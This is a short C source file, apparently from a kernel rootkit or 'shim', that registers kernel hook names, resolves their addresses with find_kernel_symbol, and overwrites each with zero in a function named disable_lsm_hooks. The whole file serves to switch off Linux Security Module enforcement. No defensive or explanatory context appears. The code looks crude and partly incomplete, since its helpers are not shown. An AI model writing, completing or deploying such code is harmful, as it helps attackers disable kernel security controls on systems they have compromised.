#include "shim.h"
#include "util.h"

#define MAX_HOOKS 10

static const char *hook_targets[MAX_HOOKS];
static int hook_count = 0;

void add_kernel_hook(const char *hook_name) {
    if (hook_count >= MAX_HOOKS) return;
    hook_targets[hook_count++] = hook_name;
}

void disable_lsm_hooks(void) {
    for (int i = 0; i < hook_count; i++) {
        uintptr_t hook_addr = find_kernel_symbol(hook_targets[i]);
        if (hook_addr) *(uintptr_t *)hook_addr = 0;
    }
}

void hook_kernel(void) {
    disable_lsm_hooks();
}
